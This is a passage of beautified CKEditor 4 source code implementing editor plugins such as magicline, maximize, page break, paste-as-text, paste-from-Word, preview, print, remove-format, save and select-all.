            if (e.view || (e.view = {}), n = e.view, t || !(n && n.date > new Date() - o)) {
                var n = (i = e.win).getScrollPosition(), i = i.getViewPaneSize();
                y(e.view, {
                    scroll: {
                        x: n.x,
                        y: n.y,
                        width: e.doc.$.documentElement.scrollWidth - i.width,
                        height: e.doc.$.documentElement.scrollHeight - i.height
                    },
                    pane: {
                        width: i.width,
                        height: i.height,
                        bottom: i.height + n.y
                    },
                    date: +new Date()
                }, !0);
            }
        }
        CKEDITOR.plugins.add("magicline", {
            init: function(o) {
                var i, a, r, s = o.config, e = s.magicline_triggerOffset || 30, l = {
                    editor: o,
                    enterMode: s.enterMode,
                    triggerOffset: e,
                    holdDistance: 0 | e * (s.magicline_holdDistance || .5),
                    boxColor: s.magicline_color || "#ff0000",
                    rtl: "rtl" == s.contentsLangDirection,
                    tabuList: [ "data-cke-hidden-sel" ].concat(s.magicline_tabuList || []),
                    triggers: s.magicline_everywhere ? z : {
                        table: 1,
                        hr: 1,
                        div: 1,
                        ul: 1,
                        ol: 1,
                        dl: 1,
                        form: 1,
                        blockquote: 1
                    },
                    isRelevant: function(e) {
                        return E(e) && !u(l, e) && !p(e);
                    }
                };
                o.on("contentDom", function() {
                    var e = o.editable(), t = o.document, n = o.window;
                    y(l, {
                        editable: e,
                        inInlineMode: e.isInline(),
                        doc: t,
                        win: n,
                        hotNode: null
                    }, !0), l.boundary = l.inInlineMode ? l.editable : l.doc.getDocumentElement(), e.is(w.$inline) || (l.inInlineMode && !T(e) && e.setStyles({
                        position: "relative",
                        top: null,
                        left: null
                    }), function(c) {
                        var e = c.doc, t = k('<span contenteditable="false" style="' + j + "position:absolute;border-top:1px dashed " + c.boxColor + '"></span>', e), n = CKEDITOR.getUrl(this.path + "images/" + (N.hidpi ? "hidpi/" : "") + "icon" + (c.rtl ? "-rtl" : "") + ".png");
                        for (y(t, {
                            attach: function() {
                                return this.wrap.getParent() || this.wrap.appendTo(c.editable, !0), this;
                            },
                            lineChildren: [ y(k('<span title="' + c.editor.lang.magicline.title + '" contenteditable="false">&#8629;</span>', e), {
                                base: j + "height:17px;width:17px;" + (c.rtl ? "left" : "right") + ":17px;background:url(" + n + ") center no-repeat " + c.boxColor + ";cursor:pointer;" + (N.hc ? "font-size: 15px;line-height:14px;border:1px solid #fff;text-align:center;" : "") + (N.hidpi ? "background-size: 9px 10px;" : ""),
                                looks: [ "top:-8px;" + CKEDITOR.tools.cssVendorPrefix("border-radius", "2px", 1), "top:-17px;" + CKEDITOR.tools.cssVendorPrefix("border-radius", "2px 2px 0px 0px", 1), "top:-1px;" + CKEDITOR.tools.cssVendorPrefix("border-radius", "0px 0px 2px 2px", 1) ]
                            }), y(k(V, e), {
                                base: U + "left:0px;border-left-color:" + c.boxColor + ";",
                                looks: [ "border-width:8px 0 8px 8px;top:-8px", "border-width:8px 0 0 8px;top:-8px", "border-width:0 0 8px 8px;top:0px" ]
                            }), y(k(V, e), {
                                base: U + "right:0px;border-right-color:" + c.boxColor + ";",
                                looks: [ "border-width:8px 8px 8px 0;top:-8px", "border-width:8px 8px 0 0;top:-8px", "border-width:0 8px 8px 0;top:0px" ]
                            }) ],
                            detach: function() {
                                return this.wrap.getParent() && this.wrap.remove(), this;
                            },
                            mouseNear: function() {
                                v(c, this);
                                var e = c.holdDistance, t = this.size;
                                return !!(t && c.mouse.y > t.top - e && c.mouse.y < t.bottom + e && c.mouse.x > t.left - e && c.mouse.x < t.right + e);
                            },
                            place: function() {
                                var e = c.view, t = c.editable, n = c.trigger, i = n.upper, o = n.lower, a = i || o, r = a.getParent(), s = {};
                                for (var l in this.trigger = n, i && v(c, i, !0), o && v(c, o, !0), v(c, r, !0),
                                c.inInlineMode && b(c, !0), r.equals(t) ? (s.left = e.scroll.x, s.right = -e.scroll.x,
                                s.width = "") : (s.left = a.size.left - a.size.margin.left + e.scroll.x - (c.inInlineMode ? e.editable.left + e.editable.border.left : 0),
                                s.width = a.size.outerWidth + a.size.margin.left + a.size.margin.right + e.scroll.x,
                                s.right = ""), i && o ? s.top = i.size.margin.bottom === o.size.margin.top ? 0 | i.size.bottom + i.size.margin.bottom / 2 : i.size.margin.bottom < o.size.margin.top ? i.size.bottom + i.size.margin.bottom : i.size.bottom + i.size.margin.bottom - o.size.margin.top : i ? o || (s.top = i.size.bottom + i.size.margin.bottom) : s.top = o.size.top - o.size.margin.top,
                                n.is(P) || s.top > e.scroll.y - 15 && s.top < e.scroll.y + 5 ? (s.top = c.inInlineMode ? 0 : e.scroll.y,
                                this.look(P)) : n.is(F) || s.top > e.pane.bottom - 5 && s.top < e.pane.bottom + 15 ? (s.top = c.inInlineMode ? e.editable.height + e.editable.padding.top + e.editable.padding.bottom : e.pane.bottom - 1,
                                this.look(F)) : (c.inInlineMode && (s.top -= e.editable.top + e.editable.border.top),
                                this.look($)), c.inInlineMode && (s.top--, s.top += e.editable.scroll.top, s.left += e.editable.scroll.left),
                                s) s[l] = CKEDITOR.tools.cssLength(s[l]);
                                this.setStyles(s);
                            },
                            look: function(e) {
                                if (this.oldLook != e) {
                                    for (var t, n = this.lineChildren.length; n--; ) (t = this.lineChildren[n]).setAttribute("style", t.base + t.looks[0 | e / 2]);
                                    this.oldLook = e;
                                }
                            },
                            wrap: new _("span", c.doc)
                        }), e = t.lineChildren.length; e--; ) t.lineChildren[e].appendTo(t);
                        t.look($), t.appendTo(t.wrap), t.unselectable(), t.lineChildren[0].on("mouseup", function(e) {
                            t.detach(), d(c, function(e) {
                                var t = c.line.trigger;
                                e[t.is(x) ? "insertBefore" : "insertAfter"](t.is(x) ? t.lower : t.upper);
                            }, !0), c.editor.focus(), !N.ie && c.enterMode != CKEDITOR.ENTER_BR && c.hotNode.scrollIntoView(),
                            e.data.preventDefault(!0);
                        }), t.on("mousedown", function(e) {
                            e.data.preventDefault(!0);
                        }), c.line = t;
                    }.call(this, l), K(l), e.attachListener(o, "beforeUndoImage", function() {
                        l.line.detach();
                    }), e.attachListener(o, "beforeGetData", function() {
                        l.line.wrap.getParent() && (l.line.detach(), o.once("getData", function() {
                            l.line.attach();
                        }, null, null, 1e3));
                    }, null, null, 0), e.attachListener(l.inInlineMode ? t : t.getWindow().getFrame(), "mouseout", function(e) {
                        if ("wysiwyg" == o.mode) if (l.inInlineMode) {
                            var t = e.data.$.clientX;
                            e = e.data.$.clientY, K(l), b(l, !0);
                            var n = l.view.editable, i = l.view.scroll;
                            t > n.left - i.x && t < n.right - i.x && e > n.top - i.y && e < n.bottom - i.y || (clearTimeout(r),
                            r = null, l.line.detach());
                        } else clearTimeout(r), r = null, l.line.detach();
                    }), e.attachListener(e, "keyup", function() {
                        l.hiddenMode = 0;
                    }), e.attachListener(e, "keydown", function(e) {
                        if ("wysiwyg" == o.mode) switch (e.data.getKeystroke()) {
                          case 2228240:
                          case 16:
                            l.hiddenMode = 1, l.line.detach();
                        }
                    }), e.attachListener(l.inInlineMode ? e : t, "mousemove", function(e) {
                        if (a = !0, "wysiwyg" == o.mode && !o.readOnly && !r) {
                            var t = {
                                x: e.data.$.clientX,
                                y: e.data.$.clientY
                            };
                            r = setTimeout(function() {
                                l.mouse = t, r = l.trigger = null, K(l), a && !l.hiddenMode && o.focusManager.hasFocus && !l.line.mouseNear() && (l.element = W(l, !0)) && ((l.trigger = O(l) || D(l) || Y(l)) && !I(l, l.trigger.upper || l.trigger.lower) ? l.line.attach().place() : (l.trigger = null,
                                l.line.detach()), a = !1);
                            }, 30);
                        }
                    }), e.attachListener(n, "scroll", function() {
                        "wysiwyg" == o.mode && (l.line.detach(), N.webkit && (l.hiddenMode = 1, clearTimeout(i),
                        i = setTimeout(function() {
                            l.mouseDown || (l.hiddenMode = 0);
                        }, 50)));
                    }), e.attachListener(S ? t : n, "mousedown", function() {
                        "wysiwyg" == o.mode && (l.line.detach(), l.hiddenMode = 1, l.mouseDown = 1);
                    }), e.attachListener(S ? t : n, "mouseup", function() {
                        l.hiddenMode = 0, l.mouseDown = 0;
                    }), o.addCommand("accessPreviousSpace", c(l)), o.addCommand("accessNextSpace", c(l, !0)),
                    o.setKeystroke([ [ s.magicline_keystrokePrevious, "accessPreviousSpace" ], [ s.magicline_keystrokeNext, "accessNextSpace" ] ]),
                    o.on("loadSnapshot", function() {
                        var e, t, n, i;
                        for (i in {
                            p: 1,
                            br: 1,
                            div: 1
                        }) for (n = (e = o.document.getElementsByTag(i)).count(); n--; ) if ((t = e.getItem(n)).data("cke-magicline-hot")) return l.hotNode = t,
                        void (l.lastCmdDirection = "true" === t.data("cke-magicline-dir"));
                    }), this.backdoor = {
                        accessFocusSpace: d,
                        boxTrigger: m,
                        isLine: u,
                        getAscendantTrigger: h,
                        getNonEmptyNeighbour: g,
                        getSize: R,
                        that: l,
                        triggerEdge: D,
                        triggerEditable: O,
                        triggerExpand: Y
                    });
                }, this);
            }
        });
        var y = CKEDITOR.tools.extend, _ = CKEDITOR.dom.element, k = _.createFromHtml, N = CKEDITOR.env, S = CKEDITOR.env.ie && CKEDITOR.env.version < 9, w = CKEDITOR.dtd, s = {}, x = 128, A = 64, L = 32, B = 16, P = 4, F = 2, $ = 1, l = " ", M = w.$listItem, q = w.$tableContent, H = y({}, w.$nonEditable, w.$empty), z = w.$block, o = 100, j = "width:0px;height:0px;padding:0px;margin:0px;display:block;z-index:9999;color:#fff;position:absolute;font-size: 0px;line-height:0px;", U = j + "border-color:transparent;display:block;border-style:solid;", V = "<span>" + l + "</span>";
        s[CKEDITOR.ENTER_BR] = "br", s[CKEDITOR.ENTER_P] = "p", s[CKEDITOR.ENTER_DIV] = "div",
        m.prototype = {
            set: function(e, t, n) {
                return this.properties = e + t + (n || $), this;
            },
            is: function(e) {
                return (this.properties & e) == e;
            }
        };
        var W = function() {
            function r(e, t) {
                var n = e.$.elementFromPoint(t.x, t.y);
                return n && n.nodeType ? new CKEDITOR.dom.element(n) : null;
            }
            return function(e, t, n) {
                if (!e.mouse) return null;
                var i = e.doc, o = e.line.wrap, a = r(i, n = n || e.mouse);
                return t && u(e, a) && (o.hide(), a = r(i, n), o.show()), !a || a.type != CKEDITOR.NODE_ELEMENT || !a.$ || N.ie && N.version < 9 && !e.boundary.equals(a) && !e.boundary.contains(a) ? null : a;
            };
        }(), G = CKEDITOR.dom.walker.whitespaces(), X = CKEDITOR.dom.walker.nodeType(CKEDITOR.NODE_COMMENT), Y = function() {
            function h(e, t) {
                return !(t && t.type == CKEDITOR.NODE_TEXT || X(t) || p(t) || u(e, t) || t.type == CKEDITOR.NODE_ELEMENT && t.$ && t.is("br"));
            }
            return function(e) {
                var t, n = function(t) {
                    var e, n, i, o, a, r;
                    if (!E(u = t.element) || u.contains(t.editable) || u.isReadOnly()) return null;
                    if (f(0, e = (i = function(e, t, n, i) {
                        for (var o = i, a = i, r = 0, s = !1, l = !1, c = e.view.pane.height, d = e.mouse; d.y + r < c && 0 < d.y - r && (s || (s = t(o, i)),
                        l || (l = t(a, i)), !s && 0 < d.y - r && (o = n(e, {
                            x: d.x,
                            y: d.y - r
                        })), !l && d.y + r < c && (a = n(e, {
                            x: d.x,
                            y: d.y + r
                        })), !s || !l); ) r += 2;
                        return new m([ o, a, null, null ]);
                    }(t, function(e, t) {
                        return !t.equals(e);
                    }, function(e, t) {
                        return W(e, !0, t);
                    }, u)).upper, n = i.lower)) return i.set(L, 8);
                    if (e && u.contains(e)) for (;!e.getParent().equals(u); ) e = e.getParent(); else e = u.getFirst(function(e) {
                        return h(t, e);
                    });
                    if (n && u.contains(n)) for (;!n.getParent().equals(u); ) n = n.getParent(); else n = u.getLast(function(e) {
                        return h(t, e);
                    });
                    if (!e || !n) return null;
                    if (v(t, e), v(t, n), !(t.mouse.y > e.size.top && t.mouse.y < n.size.bottom)) return null;
                    for (var s, l, c, d, u = Number.MAX_VALUE; n && !n.equals(e) && (l = e.getNext(t.isRelevant)); ) (s = Math.abs((r = l,
                    v(o = t, a = e), v(o, r), o = a.size.bottom, r = r.size.top, (o && r ? 0 | (o + r) / 2 : o || r) - t.mouse.y))) < u && (u = s,
                    c = e, d = l), v(t, e = l);
                    return c && d && t.mouse.y > c.size.top && t.mouse.y < d.size.bottom ? (i.upper = c,
                    i.lower = d, i.set(L, 8)) : null;
                }(e);
                if (t = n) {
                    t = n.upper;
                    var i = n.lower;
                    t = !(!t || !i || p(i) || p(t) || i.equals(t) || t.equals(i) || i.contains(t) || t.contains(i) || !(C(e, t) && C(e, i) && f(0, t, i)));
                }
                return t ? n : null;
            };
        }(), Z = [ "top", "left", "right", "bottom" ];
    }(), CKEDITOR.config.magicline_keystrokePrevious = CKEDITOR.CTRL + CKEDITOR.SHIFT + 51,
    CKEDITOR.config.magicline_keystrokeNext = CKEDITOR.CTRL + CKEDITOR.SHIFT + 52, function() {
        function a(e) {
            if (!e || e.type != CKEDITOR.NODE_ELEMENT || "form" != e.getName()) return [];
            for (var t = [], n = [ "style", "className" ], i = 0; i < n.length; i++) {
                var o = e.$.elements.namedItem(n[i]);
                o && (o = new CKEDITOR.dom.element(o), t.push([ o, o.nextSibling ]), o.remove());
            }
            return t;
        }
        function r(e, t) {
            if (e && e.type == CKEDITOR.NODE_ELEMENT && "form" == e.getName() && 0 < t.length) for (var n = t.length - 1; 0 <= n; n--) {
                var i = t[n][0], o = t[n][1];
                o ? i.insertBefore(o) : i.appendTo(e);
            }
        }
        function f(e, t) {
            var n = a(e), i = {}, o = e.$;
            return t || (i.class = o.className || "", o.className = ""), i.inline = o.style.cssText || "",
            t || (o.style.cssText = "position: static; overflow: visible"), r(n), i;
        }
        function m(e, t) {
            var n = a(e), i = e.$;
            "class" in t && (i.className = t.class), "inline" in t && (i.style.cssText = t.inline),
            r(n);
        }
        function g(e) {
            if (!e.editable().isInline()) {
                var t, n = CKEDITOR.instances;
                for (t in n) {
                    var i = n[t];
                    "wysiwyg" == i.mode && !i.readOnly && ((i = i.document.getBody()).setAttribute("contentEditable", !1),
                    i.setAttribute("contentEditable", !0));
                }
                e.editable().hasFocus && (e.toolbox.focus(), e.focus());
            }
        }
        CKEDITOR.plugins.add("maximize", {
            init: function(o) {
                function a() {
                    var e = u.getViewPaneSize();
                    o.resize(e.width, e.height, null, !0);
                }
                if (o.elementMode != CKEDITOR.ELEMENT_MODE_INLINE) {
                    var r, s, l, c = o.lang, d = CKEDITOR.document, u = d.getWindow(), h = CKEDITOR.TRISTATE_OFF;
                    o.addCommand("maximize", {
                        modes: {
                            wysiwyg: !CKEDITOR.env.iOS,
                            source: !CKEDITOR.env.iOS
                        },
                        readOnly: 1,
                        editorFocus: !1,
                        exec: function() {
                            var e = o.container.getFirst(function(e) {
                                return e.type == CKEDITOR.NODE_ELEMENT && e.hasClass("cke_inner");
                            }), t = o.ui.space("contents");
                            if ("wysiwyg" == o.mode) {
                                var n = o.getSelection();
                                r = n && n.getRanges(), s = u.getScrollPosition();
                            } else {
                                var i = o.editable().$;
                                r = !CKEDITOR.env.ie && [ i.selectionStart, i.selectionEnd ], s = [ i.scrollLeft, i.scrollTop ];
                            }
                            if (this.state == CKEDITOR.TRISTATE_OFF) {
                                for (u.on("resize", a), l = u.getScrollPosition(), n = o.container; n = n.getParent(); ) n.setCustomData("maximize_saved_styles", f(n)),
                                n.setStyle("z-index", o.config.baseFloatZIndex - 5);
                                t.setCustomData("maximize_saved_styles", f(t, !0)), e.setCustomData("maximize_saved_styles", f(e, !0)),
                                t = {
                                    overflow: CKEDITOR.env.webkit ? "" : "hidden",
                                    width: 0,
                                    height: 0
                                }, d.getDocumentElement().setStyles(t), !CKEDITOR.env.gecko && d.getDocumentElement().setStyle("position", "fixed"),
                                (!CKEDITOR.env.gecko || !CKEDITOR.env.quirks) && d.getBody().setStyles(t), CKEDITOR.env.ie ? setTimeout(function() {
                                    u.$.scrollTo(0, 0);
                                }, 0) : u.$.scrollTo(0, 0), e.setStyle("position", CKEDITOR.env.gecko && CKEDITOR.env.quirks ? "fixed" : "absolute"),
                                e.$.offsetLeft, e.setStyles({
                                    "z-index": o.config.baseFloatZIndex - 5,
                                    left: "0px",
                                    top: "0px"
                                }), e.addClass("cke_maximized"), a(), t = e.getDocumentPosition(), e.setStyles({
                                    left: -1 * t.x + "px",
                                    top: -1 * t.y + "px"
                                }), CKEDITOR.env.gecko && g(o);
                            } else if (this.state == CKEDITOR.TRISTATE_ON) {
                                for (u.removeListener("resize", a), t = [ t, e ], n = 0; n < t.length; n++) m(t[n], t[n].getCustomData("maximize_saved_styles")),
                                t[n].removeCustomData("maximize_saved_styles");
                                for (n = o.container; n = n.getParent(); ) m(n, n.getCustomData("maximize_saved_styles")),
                                n.removeCustomData("maximize_saved_styles");
                                CKEDITOR.env.ie ? setTimeout(function() {
                                    u.$.scrollTo(l.x, l.y);
                                }, 0) : u.$.scrollTo(l.x, l.y), e.removeClass("cke_maximized"), CKEDITOR.env.webkit && (e.setStyle("display", "inline"),
                                setTimeout(function() {
                                    e.setStyle("display", "block");
                                }, 0)), o.fire("resize");
                            }
                            this.toggleState(), (n = this.uiItems[0]) && (t = this.state == CKEDITOR.TRISTATE_OFF ? c.maximize.maximize : c.maximize.minimize,
                            (n = CKEDITOR.document.getById(n._.id)).getChild(1).setHtml(t), n.setAttribute("title", t),
                            n.setAttribute("href", 'javascript:void("' + t + '");')), "wysiwyg" == o.mode ? r ? (CKEDITOR.env.gecko && g(o),
                            o.getSelection().selectRanges(r), (i = o.getSelection().getStartElement()) && i.scrollIntoView(!0)) : u.$.scrollTo(s.x, s.y) : (r && (i.selectionStart = r[0],
                            i.selectionEnd = r[1]), i.scrollLeft = s[0], i.scrollTop = s[1]), r = s = null,
                            h = this.state, o.fire("maximize", this.state);
                        },
                        canUndo: !1
                    }), o.ui.addButton && o.ui.addButton("Maximize", {
                        label: c.maximize.maximize,
                        command: "maximize",
                        toolbar: "tools,10"
                    }), o.on("mode", function() {
                        var e = o.getCommand("maximize");
                        e.setState(e.state == CKEDITOR.TRISTATE_DISABLED ? CKEDITOR.TRISTATE_DISABLED : h);
                    }, null, null, 100);
                }
            }
        });
    }(), CKEDITOR.plugins.add("newpage", {
        init: function(e) {
            e.addCommand("newpage", {
                modes: {
                    wysiwyg: 1,
                    source: 1
                },
                exec: function(e) {
                    var t = this;
                    e.setData(e.config.newpage_html || "", function() {
                        e.focus(), setTimeout(function() {
                            e.fire("afterCommandExec", {
                                name: "newpage",
                                command: t
                            }), e.selectionChange();
                        }, 200);
                    });
                },
                async: !0
            }), e.ui.addButton && e.ui.addButton("NewPage", {
                label: e.lang.newpage.toolbar,
                command: "newpage",
                toolbar: "document,20"
            });
        }
    }), function() {
        function r(e) {
            return {
                "aria-label": e,
                class: "cke_pagebreak",
                contenteditable: "false",
                "data-cke-display-name": "pagebreak",
                "data-cke-pagebreak": 1,
                style: "page-break-after: always",
                title: e
            };
        }
        CKEDITOR.plugins.add("pagebreak", {
            requires: "fakeobjects",
            onLoad: function() {
                var e = ("background:url(" + CKEDITOR.getUrl(this.path + "images/pagebreak.gif") + ") no-repeat center center;clear:both;width:100%;border-top:#999 1px dotted;border-bottom:#999 1px dotted;padding:0;height:5px;cursor:default;").replace(/;/g, " !important;");
                CKEDITOR.addCss("div.cke_pagebreak{" + e + "}");
            },
            init: function(t) {
                t.blockless || (t.addCommand("pagebreak", CKEDITOR.plugins.pagebreakCmd), t.ui.addButton && t.ui.addButton("PageBreak", {
                    label: t.lang.pagebreak.toolbar,
                    command: "pagebreak",
                    toolbar: "insert,70"
                }), CKEDITOR.env.webkit && t.on("contentDom", function() {
                    t.document.on("click", function(e) {
                        (e = e.data.getTarget()).is("div") && e.hasClass("cke_pagebreak") && t.getSelection().selectElement(e);
                    });
                }));
            },
            afterInit: function(t) {
                function n(e) {
                    CKEDITOR.tools.extend(e.attributes, r(t.lang.pagebreak.alt), !0), e.children.length = 0;
                }
                var e = t.dataProcessor, i = e && e.dataFilter, o = /page-break-after\s*:\s*always/i, a = /display\s*:\s*none/i;
                (e = e && e.htmlFilter) && e.addRules({
                    attributes: {
                        class: function(e, t) {
                            var n = e.replace("cke_pagebreak", "");
                            if (n != e) {
                                var i = CKEDITOR.htmlParser.fragment.fromHtml('<span style="display: none;">&nbsp;</span>').children[0];
                                t.children.length = 0, t.add(i), delete (i = t.attributes)["aria-label"], delete i.contenteditable,
                                delete i.title;
                            }
                            return n;
                        }
                    }
                }, {
                    applyToAll: !0,
                    priority: 5
                }), i && i.addRules({
                    elements: {
                        div: function(e) {
                            if (e.attributes["data-cke-pagebreak"]) n(e); else if (o.test(e.attributes.style)) {
                                var t = e.children[0];
                                t && "span" == t.name && a.test(t.attributes.style) && n(e);
                            }
                        }
                    }
                });
            }
        }), CKEDITOR.plugins.pagebreakCmd = {
            exec: function(e) {
                var t = e.document.createElement("div", {
                    attributes: r(e.lang.pagebreak.alt)
                });
                e.insertElement(t);
            },
            context: "div",
            allowedContent: {
                div: {
                    styles: "!page-break-after"
                },
                span: {
                    match: function(e) {
                        return (e = e.parent) && "div" == e.name && e.styles && e.styles["page-break-after"];
                    },
                    styles: "display"
                }
            },
            requiredContent: "div{page-break-after}"
        };
    }(), a = {
        canUndo: !1,
        async: !0,
        exec: function(t) {
            t.getClipboardData({
                title: t.lang.pastetext.title
            }, function(e) {
                e && t.fire("paste", {
                    type: "text",
                    dataValue: e.dataValue
                }), t.fire("afterCommandExec", {
                    name: "pastetext",
                    command: a,
                    returnValue: !!e
                });
            });
        }
    }, CKEDITOR.plugins.add("pastetext", {
        requires: "clipboard",
        init: function(t) {
            t.addCommand("pastetext", a), t.ui.addButton && t.ui.addButton("PasteText", {
                label: t.lang.pastetext.button,
                command: "pastetext",
                toolbar: "clipboard,40"
            }), t.config.forcePasteAsPlainText && t.on("beforePaste", function(e) {
                "html" != e.data.type && (e.data.type = "text");
            }), t.on("pasteState", function(e) {
                t.getCommand("pastetext").setState(e.data);
            });
        }
    }), function() {
        function e(e) {
            e.data.type = "html";
        }
        CKEDITOR.plugins.add("pastefromword", {
            requires: "clipboard",
            init: function(l) {
                var c = 0, d = this.path;
                l.addCommand("pastefromword", {
                    canUndo: !1,
                    async: !0,
                    exec: function(t) {
                        var n = this;
                        c = 1, t.once("beforePaste", e), t.getClipboardData({
                            title: t.lang.pastefromword.title
                        }, function(e) {
                            e && t.fire("paste", {
                                type: "html",
                                dataValue: e.dataValue
                            }), t.fire("afterCommandExec", {
                                name: "pastefromword",
                                command: n,
                                returnValue: !!e
                            });
                        });
                    }
                }), l.ui.addButton && l.ui.addButton("PasteFromWord", {
                    label: l.lang.pastefromword.toolbar,
                    command: "pastefromword",
                    toolbar: "clipboard,50"
                }), l.on("pasteState", function(e) {
                    l.getCommand("pastefromword").setState(e.data);
                }), l.on("paste", function(e) {
                    var t, n, i, o, a = e.data, r = a.dataValue;
                    if (r && (c || /(class=\"?Mso|style=\"[^\"]*\bmso\-|w:WordDocument)/.test(r))) {
                        var s = (t = l, n = d, i = function() {
                            s ? l.fire("paste", a) : (!l.config.pasteFromWordPromptCleanup || c || confirm(l.lang.pastefromword.confirmCleanup)) && (a.dataValue = CKEDITOR.cleanWord(r, l)),
                            c = 0;
                        }, (o = CKEDITOR.cleanWord) ? i() : (t = CKEDITOR.getUrl(t.config.pasteFromWordCleanupFile || n + "filter/default.js"),
                        CKEDITOR.scriptLoader.load(t, i, null, !0)), !o);
                        s && e.cancel();
                    }
                }, null, null, 3);
            }
        });
    }(), o = {
        modes: {
            wysiwyg: 1,
            source: 1
        },
        canUndo: !1,
        readOnly: 1,
        exec: function(e) {
            var t, n, i = (a = e.config).baseHref ? '<base href="' + a.baseHref + '"/>' : "";
            a.fullPage ? t = e.getData().replace(/<head>/, "$&" + i).replace(/[^>]*(?=<\/title>)/, "$& &mdash; " + e.lang.preview.preview) : (a = "<body ",
            (r = e.document && e.document.getBody()) && (r.getAttribute("id") && (a += 'id="' + r.getAttribute("id") + '" '),
            r.getAttribute("class") && (a += 'class="' + r.getAttribute("class") + '" ')), t = e.config.docType + '<html dir="' + e.config.contentsLangDirection + '"><head>' + i + "<title>" + e.lang.preview.preview + "</title>" + CKEDITOR.tools.buildStyleHtml(e.config.contentsCss) + "</head>" + a + ">" + e.getData() + "</body></html>"),
            i = 640, a = 420, r = 80;
            try {
                var o = window.screen, a = (i = Math.round(.8 * o.width), Math.round(.7 * o.height)), r = Math.round(.1 * o.width);
            } catch (e) {}
            return !1 !== e.fire("contentPreview", e = {
                dataValue: t
            }) && (o = "", CKEDITOR.env.ie && (window._cke_htmlToLoad = e.dataValue, n = "javascript:void( (function(){document.open();" + ("(" + CKEDITOR.tools.fixDomain + ")();").replace(/\/\/.*?\n/g, "").replace(/parent\./g, "window.opener.") + "document.write( window.opener._cke_htmlToLoad );document.close();window.opener._cke_htmlToLoad = null;})() )",
            o = ""), CKEDITOR.env.gecko && (window._cke_htmlToLoad = e.dataValue, o = CKEDITOR.getUrl(s + "preview.html")),
            o = window.open(o, null, "toolbar=yes,location=no,status=yes,menubar=yes,scrollbars=yes,resizable=yes,width=" + i + ",height=" + a + ",left=" + r),
            CKEDITOR.env.ie && o && (o.location = n), !CKEDITOR.env.ie && !CKEDITOR.env.gecko && ((n = o.document).open(),
            n.write(e.dataValue), n.close()), !0);
        }
    }, CKEDITOR.plugins.add("preview", {
        init: function(e) {
            e.elementMode != CKEDITOR.ELEMENT_MODE_INLINE && (s = this.path, e.addCommand("preview", o),
            e.ui.addButton && e.ui.addButton("Preview", {
                label: e.lang.preview.preview,
                command: "preview",
                toolbar: "document,40"
            }));
        }
    }), CKEDITOR.plugins.add("print", {
        init: function(e) {
            e.elementMode != CKEDITOR.ELEMENT_MODE_INLINE && (e.addCommand("print", CKEDITOR.plugins.print),
            e.ui.addButton && e.ui.addButton("Print", {
                label: e.lang.print.toolbar,
                command: "print",
                toolbar: "document,50"
            }));
        }
    }), CKEDITOR.plugins.print = {
        exec: function(e) {
            CKEDITOR.env.gecko ? e.window.$.print() : e.document.$.execCommand("Print");
        },
        canUndo: !1,
        readOnly: 1,
        modes: {
            wysiwyg: 1
        }
    }, CKEDITOR.plugins.add("removeformat", {
        init: function(e) {
            e.addCommand("removeFormat", CKEDITOR.plugins.removeformat.commands.removeformat),
            e.ui.addButton && e.ui.addButton("RemoveFormat", {
                label: e.lang.removeformat.toolbar,
                command: "removeFormat",
                toolbar: "cleanup,10"
            });
        }
    }), CKEDITOR.plugins.removeformat = {
        commands: {
            removeformat: {
                exec: function(a) {
                    for (var e, r = a._.removeFormatRegex || (a._.removeFormatRegex = RegExp("^(?:" + a.config.removeFormatTags.replace(/,/g, "|") + ")$", "i")), t = a._.removeAttributes || (a._.removeAttributes = a.config.removeFormatAttributes.split(",")), s = CKEDITOR.plugins.removeformat.filter, n = a.getSelection().getRanges(), i = n.createIterator(), o = function(e) {
                        return e.type == CKEDITOR.NODE_ELEMENT;
                    }; e = i.getNextRange(); ) {
                        e.collapsed || e.enlarge(CKEDITOR.ENLARGE_ELEMENT);
                        var l = e.createBookmark(), c = l.startNode, d = l.endNode, u = function(e) {
                            for (var t, n = a.elementPath(e), i = n.elements, o = 1; (t = i[o]) && !t.equals(n.block) && !t.equals(n.blockLimit); o++) r.test(t.getName()) && s(a, t) && e.breakParent(t);
                        };
                        if (u(c), d) for (u(d), c = c.getNextSourceNode(!0, CKEDITOR.NODE_ELEMENT); c && !c.equals(d); ) if (c.isReadOnly()) {
                            if (c.getPosition(d) & CKEDITOR.POSITION_CONTAINS) break;
                            c = c.getNext(o);
                        } else u = c.getNextSourceNode(!1, CKEDITOR.NODE_ELEMENT), !("img" == c.getName() && c.data("cke-realelement")) && s(a, c) && (r.test(c.getName()) ? c.remove(1) : (c.removeAttributes(t),
                        a.fire("removeFormatCleanup", c))), c = u;
                        e.moveToBookmark(l);
                    }
                    a.forceNextSelectionCheck(), a.getSelection().selectRanges(n);
                }
            }
        },
        filter: function(e, t) {
            for (var n = e._.removeFormatFilters || [], i = 0; i < n.length; i++) if (!1 === n[i](t)) return !1;
            return !0;
        }
    }, CKEDITOR.editor.prototype.addRemoveFormatFilter = function(e) {
        this._.removeFormatFilters || (this._.removeFormatFilters = []), this._.removeFormatFilters.push(e);
    }, CKEDITOR.config.removeFormatTags = "b,big,cite,code,del,dfn,em,font,i,ins,kbd,q,s,samp,small,span,strike,strong,sub,sup,tt,u,var",
    CKEDITOR.config.removeFormatAttributes = "class,style,lang,width,height,align,hspace,valign",
    t = {
        readOnly: 1,
        exec: function(t) {
            if (t.fire("save") && (t = t.element.$.form)) try {
                t.submit();
            } catch (e) {
                t.submit.click && t.submit.click();
            }
        }
    }, CKEDITOR.plugins.add("save", {
        init: function(e) {
            e.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE && (e.addCommand("save", t).modes = {
                wysiwyg: !!e.element.$.form
            }, e.ui.addButton && e.ui.addButton("Save", {
                label: e.lang.save.toolbar,
                command: "save",
                toolbar: "document,10"
            }));
        }
    }), CKEDITOR.plugins.add("selectall", {
        init: function(e) {
            e.addCommand("selectAll", {
                modes: {
                    wysiwyg: 1,
                    source: 1
                },
                exec: function(e) {
                    var t = e.editable();
                    if (t.is("textarea")) e = t.$, CKEDITOR.env.ie ? e.createTextRange().execCommand("SelectAll") : (e.selectionStart = 0,
                    e.selectionEnd = e.value.length), e.focus(); else {
                        if (t.is("body")) e.document.$.execCommand("SelectAll", !1, null); else {
                            var n = e.createRange();
                            n.selectNodeContents(t), n.select();
                        }
                        e.forceNextSelectionCheck(), e.selectionChange();
                    }
                },
                canUndo: !1
            }), e.ui.addButton && e.ui.addButton("SelectAll", {
                label: e.lang.selectall.toolbar,
                command: "selectAll",
                toolbar: "selection,10"
            });
        }
    }), i = {
        readOnly: 1,
        preserveState: !0,
        editorFocus: !1,
        exec: function(e) {
